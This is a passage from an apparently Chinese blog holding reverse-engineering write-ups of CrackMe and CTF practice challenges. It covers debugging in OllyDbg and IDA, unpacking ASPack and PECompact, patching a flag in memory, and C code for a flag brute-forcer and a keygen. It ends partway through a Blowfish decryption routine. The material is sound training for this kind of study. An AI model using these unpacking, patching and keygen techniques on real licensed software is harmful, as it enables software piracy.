rel="noopener">https://blog.csdn.net/LL596214569/article/details/89163734</a></p><p>了解多线程后，理解这个程序就很好了，首先是看是否有创建事件，查找API：CreatEvent。在创建线程API：CreatThread下断点，从CreatThread找到线程函数的地址。接着就是下图中的函数：<img src="/2020/07/31/CrackMe/image-20200731182155636.png" alt="image-20200731182155636"></p><p><strong>最后</strong>，所以程序的整体逻辑就是首先创建2个事件，再创建2个线程，2个线程函数都有WaitForSingleObject函数一直等待事件的信号后再向下继续执行。而我们输入name与key后点击Ok就会发生按钮事件，触发OS向程序发现消息，然后执行SetEvent函数将指定线程的WaitForSingleObject函数等待的指定事件设置为有信号状态。<img src="/2020/07/31/CrackMe/image-20200731183904491.png" alt="image-20200731183904491"></p><p>接下来在该线程进行验证name与key，如果验证通过的话设置另外一个线程等待的指定的事件设置为有信号状态，另一个线程开始执行显示提示正确的对话框的代码。<strong>简而言之：一个线程负责验证，一个线程负责显示。</strong></p><h2 id="渐入佳境"><a href="#渐入佳境" class="headerlink" title="渐入佳境"></a>渐入佳境</h2><p>——题目来自看雪题库</p><p>运行一下程序，有错误输入提示框。</p><p>上手直接找MessageBox，到达代码处向上分析：所以我们要向上回溯找到对ebp+c赋值处。<img src="/2020/07/31/CrackMe/image-20200801132230026.png" alt="image-20200801132230026"></p><p>继续向上回溯可以看到：<img src="/2020/07/31/CrackMe/image-20200801132543497.png" alt="image-20200801132543497"></p><p>所以下面跳转的地方就是验证过程：算法很简单。<img src="/2020/07/31/CrackMe/image-20200801132628646.png" alt="image-20200801132628646"></p><h2 id="CrackMe01"><a href="#CrackMe01" class="headerlink" title="CrackMe01"></a>CrackMe01</h2><p>——题目来自“百度杯”CTF比赛十一月场</p><p>还是上手载入OD，找一下获取输入文本相关的API：<img src="/2020/07/31/CrackMe/image-20200805164512873.png" alt="image-20200805164512873"></p><p>开始只看到第一个，下断后在程序输入内容后却没有断下。还以为又是多线程，分析一波后确实创建了一个线程，但不对。后面才在第二个GetWindowTextW下断，输入内容后程序断下。</p><p>单步跟踪后发现，将输入的字符传到另外一个内存空间存储后，再调用PostMessageW函数将输入字符传给指定句柄的窗口。这里打开ida看下：<img src="/2020/07/31/CrackMe/image-20200805170315887.png" alt="image-20200805170315887"></p><p>之后可以直接查找默认消息处理函数：DefWindowProc 来定位处理输入字符的代码处。</p><p>这里看PostMessage函数第一个参数的交叉引用来定位目的代码。因为hWnd是接收消息的窗口句柄，我们看个窗口的句柄赋值给了hWnd。hWnd是全局变量。</p><p>从交叉引用来到下面的函数：<img src="/2020/07/31/CrackMe/image-20200805172125636.png" alt="image-20200805172125636"></p><p>可以看到，使用了WinClass定义了一个窗口的类，对每个属性赋值后使用RegisterClassW来注册窗口，最后通过CreatWindowExW将该窗口实例化，并此窗口句柄赋值给Hwnd。所以我们输入的字符串是发送给了这个窗口。</p><p>另外，WndClass中的成员lpfnWndProc指向一个回调函数，是窗体的消息处理函数。<strong>它接受到PostMessageW发送来的消息后即调用。</strong></p><p>进入该窗口消息处理函数：<img src="/2020/07/31/CrackMe/image-20200805172955592.png" alt="image-20200805172955592"></p><p>从上面函数知道，虽然不知道输入的具体字符串是什么，但是可以爆破出累加和，且不大于17*122 = 2074（因为输入字符长度&lt;= 17）。得到累加和我们就能知道，窗口显示出的是什么内容了。</p><p>写程序收工：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xF0</span>, <span class="number">0x04</span>, <span class="number">0xDA</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x04</span>, <span class="number">0xD1</span>, <span class="number">0x04</span>, <span class="number">0x8C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xF5</span>, <span class="number">0x04</span>, <span class="number">0xFE</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xE7</span>, <span class="number">0x04</span>, <span class="number">0xFF</span>, <span class="number">0x04</span>, <span class="number">0xE3</span>, <span class="number">0x04</span>, <span class="number">0xE9</span>, <span class="number">0x04</span>, <span class="number">0xF0</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x85</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x04</span>, <span class="number">0x84</span>, <span class="number">0x04</span>, <span class="number">0xF2</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0xF4</span>, <span class="number">0x04</span>, <span class="number">0xF3</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">2074</span>; i++)</span><br><span class="line"><span class="keyword">if</span>(((i&amp;<span class="number">0xf00</span>) == <span class="number">1024</span>) &amp;&amp; ((i&amp;<span class="number">0xf0</span>) == <span class="number">0xb0</span>) &amp;&amp; ((i&amp;<span class="number">6</span>) == <span class="number">6</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">44</span>; j += <span class="number">2</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[k++] = *(<span class="keyword">short</span> <span class="keyword">int</span> *)&amp;ida_chars[j]^i; </span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">puts</span>(flag), k = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">strcpy</span>(flag, <span class="string">""</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终得到：即第一个满足。<img src="/2020/07/31/CrackMe/image-20200805173523092.png" alt="image-20200805173523092"></p><h2 id="dame"><a href="#dame" class="headerlink" title="dame"></a>dame</h2><p>——题目来自DAMN’s Official joining Contest（是一个机构的加入测试，将程序指定破解并写出注册机）</p><p>题目链接：<a href="https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog" target="_blank" rel="noopener">https://pan.baidu.com/s/1y0pznGu6qEb1gut2M0tXog</a> 提取码：h0z9</p><p>要求：大按钮和标题显示未锁定的消息并且程序说按钮被按下时未锁定与注册机的编写。<img src="/2020/07/31/CrackMe/image-20200806181244476.png" alt="image-20200806181244476"></p><p>载入OD发现有壳，直接堆栈平衡原理把壳带走，然后dump出无壳文件。</p><p>由于我们要修改对话框模块上的内容，所以首先找到创建对话框函数。OD载入在程序入口点即可看到：DialogBoxParamA<img src="/2020/07/31/CrackMe/image-20200806181904819.png" alt="image-20200806181904819"></p><p>可以看到上图中的对话框过程函数的起始地址：<strong>401045</strong>，该处代码好像没有识别出来，且下断有提示并且执行很奇怪。载入ida中看看：<img src="/2020/07/31/CrackMe/image-20200806182148079.png" alt="image-20200806182148079"></p><p>所以enter在OD中没有识别出来，且401035-401045确实数据，401049才是代码开始，所以返回OD进行处理，注意不能nop，因为数据在后面有使用到，直接下断401049。</p><p>接下来，不断单步调试知道，DialogProc函数根据不同的消息做出相应的响应。首先创建整个对话框模板，然后不断载入各种控件。<img src="/2020/07/31/CrackMe/image-20200806182822916.png" alt="image-20200806182822916"></p><p>OD调试后，在IDA中看指定代码段：可以看到dword_402313处的值决定了控件的显示内容和样式。<img src="/2020/07/31/CrackMe/image-20200806183539623.png" alt="image-20200806183539623"></p><p>找到dword_402313赋值处：是对程序部分的代码的校验，检测是否下断点。<img src="/2020/07/31/CrackMe/image-20200806183725134.png" alt="image-20200806183725134"></p><p>虽然知道了dowrd_402313处的值影响对话框的显示，但是什么样的值才能达到我们的目的呢，回到OD动调。<img src="/2020/07/31/CrackMe/image-20200806185407720.png" alt="image-20200806185407720"></p><p>由于程序中存在代码校验，多次调试发现，当下断后[402313] = 1，为下断点[402313] = 0。 继续调试：<img src="/2020/07/31/CrackMe/image-20200806185813389.png" alt="image-20200806185813389"></p><p>到这里就清楚了，[402313]的值还决定了显示字符串的偏移位置，当[402313] = 1时，字符串为：DAMN’s TryMe -CRACKED! 而它后面一个字符串就是：UNLOCKED！所以推出：[402313]的值要等于2。</p><p>重新载入，找到合适位置在内存窗口修改[402313]的值为2，然后运行。<img src="/2020/07/31/CrackMe/image-20200806190419665.png" alt="image-20200806190419665"></p><p>对话框弹出的内容仍然不是UNLOCKED！ida中OD都可以找到MessageBoxA看一下。这里使用OD：<img src="/2020/07/31/CrackMe/image-20200806190848568.png" alt="image-20200806190848568"></p><p>从上面看到，[402308]的值会决定对不对[402313]的值修改，所以对[402308]的值修改：成功。最后要让程序之后也可以这样运行，简单的patch一下即可。</p><p>下面开始找注册算法，疑惑的是Register按钮为什么不能点击？难道还要对程序打补丁什么的，不熟悉Win32编程脑子还是一片空白。</p><p>但是机缘巧合下，让我找到了这里面的玄机。在OD中找到获取我们输入字符串的函数后，条件反射下了断。随便点击了下程序的输入文本框，程序突然在OD中断了下来。。且看到下面的一个<strong>EnableWindow</strong>函数，百度下功能：设置窗口的可用性，即我们程序的Resiter按钮是否可用。<img src="/2020/07/31/CrackMe/image-20200806193140672.png" alt="image-20200806193140672"></p><p>多次测试，发现第一个GetDlgItemTextA是获取name字符串，第二个获取key。且每输入一个name字符就调用一次第一个GetDlgItemTextA函数将该字符存入指定的内存区域，返回字符长度；每输入一个key就调用第二个GetDlgItemTextA函数将其存入指定内存区域，返回字符长度，并调用<strong>004012F3</strong>函数（应该是name与key的验证过程），最后通过<strong>004012F3</strong>函数的返回值来执行<strong>EnableWindow</strong>函数，以此决定<strong>Register</strong>按钮的按钮是否可用。</p><p>输入数据，下断004012F3并进入：<img src="/2020/07/31/CrackMe/image-20200806233948875.png" alt="image-20200806233948875"></p><p>到此，结束对程序的分析。最后将每个十六进制数转化为对应的字符的汇编指令还要多看看：<code>sbb al, 69；das；</code>。这里al = 0xE，sbb带借位减法后：al = al-0x69-CF = 0xAE。</p><blockquote><p>das：组合(压缩)BCD码的加法调整指令。<strong>功能：如果AL低四位&gt;9或AF=1 ，则AL的值减06h，并置AF=1；如果AL高四位&gt;9或CF=1 ，则AL的值减60h ,且置CF=1；</strong></p></blockquote><p>所以这里：al = al-0x60 = 0x45。<strong>而0x45就是’E’字符的ASCII。</strong></p><p>最后C语言简单写个注册机程序：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ans = <span class="number">0x44414D4E</span>, i = <span class="number">0</span>, temp = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"name："</span>);</span><br><span class="line">gets(name);</span><br><span class="line"><span class="keyword">while</span>(name[i])</span><br><span class="line">&#123;</span><br><span class="line">temp += name[i];</span><br><span class="line">ans = ((ans &gt;&gt; <span class="number">1</span>) | ((ans&amp;<span class="number">1</span>) &lt;&lt; <span class="number">31</span>));</span><br><span class="line">ans = ((ans &gt;&gt; i) | ((ans&amp;((<span class="keyword">int</span>)(<span class="built_in">pow</span>(<span class="number">2</span>, i)<span class="number">-1</span>))) &lt;&lt; <span class="number">32</span>-i));</span><br><span class="line">ans ^= temp;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line">ans |= <span class="number">0x10101010</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, ans);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="跃跃欲试"><a href="#跃跃欲试" class="headerlink" title="跃跃欲试"></a>跃跃欲试</h2><p>——题目来自看雪题库</p><p>题目加了Aspack壳，直接OD中堆栈平衡原理脱壳。</p><p>找到获取用户输入信息的API，来到验证过程：首先是下断点的4个函数对email_address验证。<img src="/2020/07/31/CrackMe/image-20200810111355447.png" alt="image-20200810111355447"></p><p>动态很多次，始终没调出这几个函数的功能且代码逻辑也奇怪。。。</p><p>题目的要求只要后面serial，或许serial与email_address与serial没有关系，干脆直接跳过email_addree设置新的EIP，来到验证serial处：<img src="/2020/07/31/CrackMe/image-20200810111950081.png" alt="image-20200810111950081"></p><p>果然，serial与email_address没有关系，serial的验证也只是简单的加减法。就是整理起来有点麻烦。</p><p>最后载入IDA看看伪代码呢。原来是C标准库里查找子字符串的函数。<img src="/2020/07/31/CrackMe/image-20200810112350707.png" alt="image-20200810112350707"></p><h2 id="一知半解"><a href="#一知半解" class="headerlink" title="一知半解"></a>一知半解</h2><p>——题目来自看雪题库</p><p>从这个CM认识了一个新壳：PEcompact</p><p>载入OD仍然使用堆栈平衡原理脱壳，但对这个壳好像不适用。。。认为自己找到了OEP，dump后发现打不开。</p><p>来到看雪论坛找师傅们脱这个壳的方法，先是使用了<a href="https://bbs.pediy.com/user-24467.htm" target="_blank" rel="noopener">CCDebuger</a>大师傅的脱壳脚本，真的是强，算是脱壳机了。脱壳后发现和我找到的OEP是一样，那我的应该是没有修复输入表导致打不开。</p><p>后面又看到了一位师傅脱这个壳的帖子，里面这样说道：</p><blockquote><p><strong>外壳完整地保留了输入表，外壳加载时没有对IAT加密；外壳解压数据时，完整的输入表会在内存中出现，然后外壳用显示加载DLL的方式获得各个函数的地址，并将该地址填充到IAT中。</strong></p></blockquote><p>所以我回到OD换了第二个dump的方式：<img src="/2020/07/31/CrackMe/image-20200811111903851.png" alt="image-20200811111903851"></p><p>哈哈，还没有用importRec就能成功打开，只不过这个也看情况。</p><p>另外记录一下用esp定律脱这个壳不一样的地方：首先下硬件访问断点。<img src="/2020/07/31/CrackMe/image-20200811112234416.png" alt="image-20200811112234416"></p><p>F9后，断在程序的领空：可以看到并不是从堆栈pop出下断的数据断下的，所以继续F9。<img src="/2020/07/31/CrackMe/image-20200811112818716.png" alt="image-20200811112818716"></p><p>后面遇到同上处理，直到看到对堆栈访问。不久看到来到OEP标志。<img src="/2020/07/31/CrackMe/image-20200811113028787.png" alt="image-20200811113028787"></p><p>最后，程序的逆向很简单。</p>]]></content>
      
      
      <categories>
          
          <category> CrackMe </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>杂合writeup</title>
      <link href="/2020/07/29/%E6%9D%82%E5%90%88writeup/"/>
      <url>/2020/07/29/%E6%9D%82%E5%90%88writeup/</url>
      
        <content type="html"><![CDATA[<p>平时一些零散的CTF题的记录。<a id="more"></a></p><h2 id="little-fish-re"><a href="#little-fish-re" class="headerlink" title="little fish (re)"></a>little fish (re)</h2><blockquote><p>链接：<a href="https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ" target="_blank" rel="noopener">https://pan.baidu.com/s/1Wpl5KjFQf33hgQpE29YuKQ</a><br>提取码：slh8<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p></blockquote><p>程序打不开，提示缺少libstdc++-6.dll，做完google半天找这个库下载，但都是32位的。。想验证flag都不行。。</p><p>ida中main函数伪代码，很简单：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817163536555.png" alt="image-20200817163536555"></p><p>加密函数整体：里面还涉及2个表，且加密有点绕。感觉是什么加密。。但不清楚。。</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164301185.png" alt="image-20200817164301185"></p><p>之后从百度了其中的一个表中部分数据，从一篇文章中找到加密算法：</p><p><img src="/2020/07/29/%E6%9D%82%E5%90%88writeup/image-20200817164720071.png" alt="image-20200817164720071"></p><p>其实题目文件有提示，但对于不知道这个加密算法来说就是没有提示。。。</p><p>然后找blowfish加密算法文章学习。<a href="https://www.cnblogs.com/my_life/articles/5845940.html" target="_blank" rel="noopener">讲的好清楚</a></p><p>再次回到ida中看题目中的加密算法，对比下，这次当然是清楚好多，也确定了就是正常的blowfish加密。</p><p>先是写找到网上的blowfish加密算法，使用C语言写来模拟了下，然后解密：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> P[<span class="number">16</span> + <span class="number">2</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> S[<span class="number">4</span>][<span class="number">256</span>];</span><br><span class="line">&#125; BLOWFISH_CTX;</span><br><span class="line"></span><br><span class="line">BLOWFISH_CTX ctx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_P[] = &#123; 原始的P盒数据 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> ORIG_S[] = &#123; 原始的S盒数据，太多这里省略 &#125;;<span class="comment">//使用PI来填充的</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">F</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> a, b, c, d;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  y;</span><br><span class="line"></span><br><span class="line">    d = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    c = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    b = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    x &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">    a = (<span class="keyword">unsigned</span> <span class="keyword">short</span>)(x &amp; <span class="number">0xFF</span>);</span><br><span class="line">    y = ctx-&gt;S[<span class="number">0</span>][a] + ctx-&gt;S[<span class="number">1</span>][b];</span><br><span class="line">    y = y ^ ctx-&gt;S[<span class="number">2</span>][c];</span><br><span class="line">    y = y + ctx-&gt;S[<span class="number">3</span>][d];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Encrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span> i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; ++i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[N];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[N + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Decrypt</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xl, <span class="keyword">unsigned</span> <span class="keyword">int</span>* xr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xl;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  Xr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>  temp;</span><br><span class="line">    <span class="keyword">short</span>       i;</span><br><span class="line"></span><br><span class="line">    Xl = *xl;</span><br><span class="line">    Xr = *xr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = N + <span class="number">1</span>; i &gt; <span class="number">1</span>; --i) &#123;</span><br><span class="line">        Xl = Xl ^ ctx-&gt;P[i];</span><br><span class="line">        Xr = F(ctx, Xl) ^ Xr;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">        temp = Xl;</span><br><span class="line">        Xl = Xr;</span><br><span class="line">        Xr = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exchange Xl and Xr */</span></span><br><span class="line">    temp = Xl;</span><br><span class="line">    Xl = Xr;</span><br><span class="line">    Xr = temp;</span><br><span class="line"></span><br><span class="line">    Xr = Xr ^ ctx-&gt;P[<span class="number">1</span>];</span><br><span class="line">    Xl = Xl ^ ctx-&gt;P[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    *xl = Xl;</span><br><span class="line">    *xr = Xr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Blowfish_Init</span><span class="params">(BLOWFISH_CTX* ctx, <span class="keyword">unsigned</span> <span class="keyword">char</span>* key, <span class="keyword">int</span> keyLen)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> data, datal, datar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">256</span>; j++)</span><br><span class="line">            ctx-&gt;S[i][j] = ORIG_S[<span class="number">256</span>*i+j];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span class="number">2</span>; ++i) &#123;</span><br><span class="line">        data = <span class="number">0x00000000</span>;</span><br><span class="line">        <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; <span class="number">4</span>; ++k) &#123;</span><br><span class="line">            data = (data &lt;&lt; <span class="number">8</span>) | key[j];</span><br><span class="line">            j = j + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= keyLen)</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ctx-&gt;P[i] = ORIG_P[i] ^ data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    datal = <span class="number">0x00000000</span>;</span><br><span class="line">    datar = <span class="number">0x00000000</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N + <span 